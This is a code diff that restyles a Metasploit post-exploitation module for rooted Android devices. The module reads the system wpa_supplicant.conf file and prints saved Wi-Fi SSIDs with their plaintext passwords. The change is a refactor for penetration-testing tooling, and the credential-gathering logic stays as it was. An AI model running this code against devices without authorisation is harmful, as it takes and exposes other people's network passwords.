@@ -9,37 +9,42 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Android::Priv
 
-  def initialize(info={})
-    super( update_info( info, {
-        'Name'          => "Displays wireless SSIDs and PSKs",
-        'Description'   => %q{
-            This module displays all wireless AP creds saved on the target device.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Gather Wireless SSIDs and PSKs',
+        'Description' => %q{
+          This module displays all wireless AP creds saved on the target device.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Auxilus', 'timwr'],
-        'SessionTypes'  => [ 'meterpreter', 'shell' ],
-        'Platform'       => 'android',
-      }
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Auxilus', 'timwr'],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Platform' => 'android',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def run
-    unless is_root?
-      print_error("This module requires root permissions.")
-      return
-    end
+    fail_with(Failure::NoAccess, 'This module requires root permissions.') unless is_root?
 
-    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
+    data = read_file('/data/misc/wifi/wpa_supplicant.conf')
     aps = parse_wpa_supplicant(data)
 
     if aps.empty?
-      print_error("No wireless APs found on the device")
+      print_error('No wireless APs found on the device')
       return
     end
+
     ap_tbl = Rex::Text::Table.new(
-      'Header'  => 'Wireless APs',
-      'Indent'  => 1,
-      'Columns' => ['SSID','net_type', 'password']
+      'Header' => 'Wireless APs',
+      'Indent' => 1,
+      'Columns' => ['SSID', 'net_type', 'password']
     )
 
     aps.each do |ap|
@@ -72,17 +77,16 @@ class MetasploitModule < Msf::Post
 
   def parse_network_block(block)
     ssid = parse_option(block, 'ssid')
-    type = parse_option(block, 'key_mgmt', false)
+    type = parse_option(block, 'key_mgmt', strip_quotes: false)
     psk = parse_option(block, 'psk')
     [ssid, type, psk]
   end
 
-  def parse_option(block, token, strip_quotes = true)
-    if strip_quotes and result = block.match(/^\s#{token}="(.+)"$/)
+  def parse_option(block, token, strip_quotes: true)
+    if strip_quotes && ((result = block.match(/^\s#{token}="(.+)"$/)))
       return result.captures[0]
-    elsif result = block.match(/^\s#{token}=(.+)$/)
+    elsif (result = block.match(/^\s#{token}=(.+)$/))
       return result.captures[0]
     end
   end
-
 end
